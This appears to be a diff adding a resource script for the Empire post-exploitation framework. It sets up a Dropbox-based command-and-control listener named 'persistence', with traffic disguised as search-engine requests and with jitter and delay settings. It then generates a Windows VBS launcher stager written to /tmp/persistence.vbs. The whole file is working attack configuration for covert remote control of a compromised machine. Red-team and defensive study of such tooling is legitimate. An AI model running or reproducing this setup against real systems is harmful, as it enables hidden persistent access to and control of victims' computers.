@@ -1,0 +1,17 @@
+# PERSISTENCE via DROPBOX
+
+listeners
+uselistener dbx
+set Name persistence
+set DefaultProfile /search?q=sports&go=Search&qs=bs&form=QBRE,/search?q=fashion&go=Search&qs=bs&form=QBRE,/search?q=trends&go=Search&qs=bs&form=QBRE,/search?q=websites&go=Search&qs=bs&form=QBRE,/search?q=images&go=Search&qs=bs&form=QBRE,/search?q=news&go=Search&qs=bs&form=QBRE,/search?q=weather&go=Search&qs=bs&form=QBRE,/search?q=shows%20tickets&go=Search&qs=bs&form=QBRE,/search?q=songs%20conversion&go=Search&qs=bs&form=QBRE|Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko
+set APIToken <api token>
+set DefaultDelay 40
+set DefaultJitter 0.4
+set PollInterval 20
+execute
+main
+usestager windows/launcher_vbs
+set Listener persistence
+set OutFile /tmp/persistence.vbs
+generate
+main
